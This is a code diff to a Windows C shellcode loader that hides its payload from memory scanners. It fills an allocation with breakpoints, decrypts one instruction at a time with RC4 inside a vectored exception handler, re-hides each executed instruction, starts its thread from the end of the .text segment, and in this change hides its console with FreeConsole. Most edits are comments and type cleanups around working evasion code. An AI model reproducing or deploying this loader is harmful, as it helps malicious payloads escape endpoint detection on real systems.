@@ -12,7 +12,12 @@
 
 
 
-// Check memory protection of prv allocation
+/// <summary>
+/// Check memory protection of newly PRV allocation
+/// </summary>
+/// <param name="allocation"></param>
+/// <param name="allocation_size"></param>
+/// <returns></returns>
 DWORD CheckAllocationProtection(LPVOID allocation, DWORD allocation_size)
 {
 	MEMORY_BASIC_INFORMATION pMemInfo = { 0 };
@@ -28,10 +33,15 @@ DWORD CheckAllocationProtection(LPVOID allocation, DWORD allocation_size)
 }
 
 
-// Resolve specified instruction feature (opcodes quota, instruction rva from base, instruction number)
+/// <summary>
+/// Resolve specified instruction feature (opcodes quota, instruction rva from base, instruction number)
+/// </summary>
+/// <param name="pointer"></param>
+/// <param name="dwOption"></param>
+/// <returns></returns>
 DWORD ResolveBufferFeature(PVOID pointer, INSTR_INFO dwOption)
 {
-	DWORD offset = 0;
+	DWORD64 offset = 0;
 	offset = (DWORD64)pointer - (DWORD64)allocation_base;
 
 	for (DWORD i = 0; i <= instructionCount; i++)
@@ -60,7 +70,10 @@ DWORD ResolveBufferFeature(PVOID pointer, INSTR_INFO dwOption)
 }
 
 
-// Resolve nullbytes at the end of .text segment
+/// <summary>
+/// Resolve nullbytes at the end of .text segment
+/// </summary>
+/// <returns></returns>
 LPVOID ResolveEndofTextSegment()
 {
 	HMODULE hCurrent = 0;
@@ -84,21 +97,29 @@ LPVOID ResolveEndofTextSegment()
 }
 
 
-// Edits current breakpoint to be the next instruction to decrypt
-NTSTATUS ResolveInstructionByRva(PVOID pointer)
+/// <summary>
+/// Modifies current breakpoint to be the next instruction to decrypt
+/// </summary>
+/// <param name="pointer"></param>
+/// <returns></returns>
+BOOL ResolveInstructionByRva(PVOID pointer)
 {
 	DWORD64 rva = ResolveBufferFeature(pointer, INSTRUCTION_OPCODES_RVA);
 	for (DWORD i = 0; i < instruction[ResolveBufferFeature(pointer, INSTRUCTION_OPCODES_NUMBER)].quota; i++)
 	{
-		*(BYTE*)((BYTE*)pointer + i) = *(BYTE*)((BYTE*)sh + rva + i);
+		*(PBYTE)((DWORD_PTR)pointer + i) = *(PBYTE)((DWORD_PTR)sh + rva + i);
 	}
 
-	return STATUS_SUCCESS;
+	return TRUE;
 
 }
 
 
-// rc4 decryption routine
+/// <summary>
+/// RC4 decryption routine
+/// </summary>
+/// <param name="pointer"></param>
+/// <returns></returns>
 NTSTATUS PatchShellcodeforException(PVOID pointer)
 {
 	NTSTATUS status = STATUS_UNSUCCESSFUL;
@@ -133,14 +154,19 @@ NTSTATUS PatchShellcodeforException(PVOID pointer)
 
 }
 
-// Resolve null-terminated string that is passed to a winapi call (RCX only for now)
+
+/// <summary>
+/// Resolve null-terminated string that is passed to a winapi call (RCX only for now -> first parameter)
+/// </summary>
+/// <param name="contextRecord"></param>
+/// <returns></returns>
 BOOL AdjustFunctionParameters(PCONTEXT contextRecord)
 {
 	BOOL status = FALSE;
 
 	if ((contextRecord->Rcx >= (DWORD64)allocation_base) && (contextRecord->Rcx <= ((DWORD64)allocation_base + sizeof(sh))))
 	{
-		if (*(BYTE*)(LPVOID*)contextRecord->Rcx == 0xCC)
+		if (*(PBYTE)contextRecord->Rcx == 0xCC)
 		{
 			DWORD current_instruction = ResolveBufferFeature((PVOID)contextRecord->Rcx, INSTRUCTION_OPCODES_NUMBER);
 			PVOID pointer = (PVOID)(contextRecord->Rcx);
@@ -151,14 +177,14 @@ BOOL AdjustFunctionParameters(PCONTEXT contextRecord)
 				PatchShellcodeforException(pointer);
 				for (DWORD i = 0; i < instruction[current_instruction].quota; i++)
 				{
-					if (*(BYTE*)(LPVOID*)((DWORD64)pointer + i) == 0x00)
+					if (*(PBYTE)((DWORD_PTR)pointer + i) == 0x00)
 					{
 						status = TRUE;
 						break;
 					}
 				}
 
-				pointer = (PVOID)((DWORD64)pointer + instruction[current_instruction].quota);
+				pointer = (PVOID)((DWORD_PTR)pointer + instruction[current_instruction].quota);
 				current_instruction++;
 
 			}
@@ -169,20 +195,29 @@ BOOL AdjustFunctionParameters(PCONTEXT contextRecord)
 
 }
 
-// Hide previous instruction
+
+/// <summary>
+/// Hide previously executed instruction
+/// </summary>
+/// <param name="pointer"></param>
+/// <returns></returns>
 BOOL RestorePreviousInstructionBreakpoint(PVOID pointer)
 {
 	DWORD current_instruction = ResolveBufferFeature(pointer, INSTRUCTION_OPCODES_NUMBER);
 	for (DWORD i = 0; i < instruction[current_instruction].quota; i++)
 	{
-		*(BYTE*)(LPVOID*)((DWORD64)pointer + i) = 0xcc;
+		*(PBYTE)((DWORD_PTR)pointer + i) = 0xCC;
 	}
 
 	return TRUE;
 }
 
 
-// VEH handler
+/// <summary>
+/// Main VEH handler
+/// </summary>
+/// <param name="exceptionData"></param>
+/// <returns></returns>
 LONG CALLBACK InterceptShellcodeException(EXCEPTION_POINTERS* exceptionData)
 {
 	if (((exceptionData->ContextRecord->Rip >= (DWORD64)allocation_base) && (exceptionData->ContextRecord->Rip <= (DWORD64)allocation_base + sizeof(sh))) || ((LPVOID)exceptionData->ContextRecord->Rip == ResolveEndofTextSegment()))
@@ -214,9 +249,9 @@ LONG CALLBACK InterceptShellcodeException(EXCEPTION_POINTERS* exceptionData)
 
 			previous_instruction = (PVOID)exceptionData->ContextRecord->Rip;
 
-			if (*(WORD*)(WORD*)exceptionData->ContextRecord->Rip == 0xe0ff) // jmp rax
+			if (*(PWORD)exceptionData->ContextRecord->Rip == 0xe0ff) // jmp rax
 			{
-				*(WORD*)(WORD*)exceptionData->ContextRecord->Rip = 0xCCCC;	// we'll never execute that jmp rax...
+				*(PWORD)exceptionData->ContextRecord->Rip = 0xCCCC;	// we'll never execute that jmp rax...
 				AdjustFunctionParameters(exceptionData->ContextRecord);
 				exceptionData->ContextRecord->Rip = exceptionData->ContextRecord->Rax; // ...override PRV allocation when calling a winapi
 				RestorePreviousInstructionBreakpoint(previous_instruction);
@@ -225,7 +260,6 @@ LONG CALLBACK InterceptShellcodeException(EXCEPTION_POINTERS* exceptionData)
 			}
 		}
 
-		// restore executable rights
 		VirtualProtect((LPVOID)exceptionData->ContextRecord->Rip, bufSize, PAGE_EXECUTE_READ, &old);
 
 		return EXCEPTION_CONTINUE_EXECUTION;
@@ -244,6 +278,7 @@ cleanup:
 
 int main()
 {
+	FreeConsole();
 	HANDLE hThread = 0;
 
 	instruction[0].RVA = 0;
@@ -445,11 +480,11 @@ int main()
 
 
 	allocation_base = VirtualAlloc(0, sizeof(sh), MEM_COMMIT, PAGE_READWRITE);
-	if (allocation_base)
+	if (allocation_base != NULL)
 	{
 		for (DWORD i = 0; i <= sizeof(sh); i++)
 		{
-			*(BYTE*)((BYTE*)allocation_base + i) = 0xCC;
+			*(PBYTE)((DWORD_PTR)allocation_base + i) = 0xCC;
 		}
 
 		// The new thread entrypoint will be inside a IMG memory space (.text segment).
@@ -457,11 +492,16 @@ int main()
 		hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ResolveEndofTextSegment(), 0, 0, 0);
 		if (hThread != 0)
 		{
-			AddVectoredExceptionHandler(1, InterceptShellcodeException);
-			WaitForSingleObject(hThread, INFINITE);
-			RemoveVectoredExceptionHandler(InterceptShellcodeException);
+			if (AddVectoredExceptionHandler(1, InterceptShellcodeException) != NULL)
+			{
+				WaitForSingleObject(hThread, INFINITE);
+				RemoveVectoredExceptionHandler(InterceptShellcodeException);
+			}
 			CloseHandle(hThread);
 		}
+
+		VirtualFree(allocation_base, 0, MEM_RELEASE);
+
 	}
 
 	return 0;
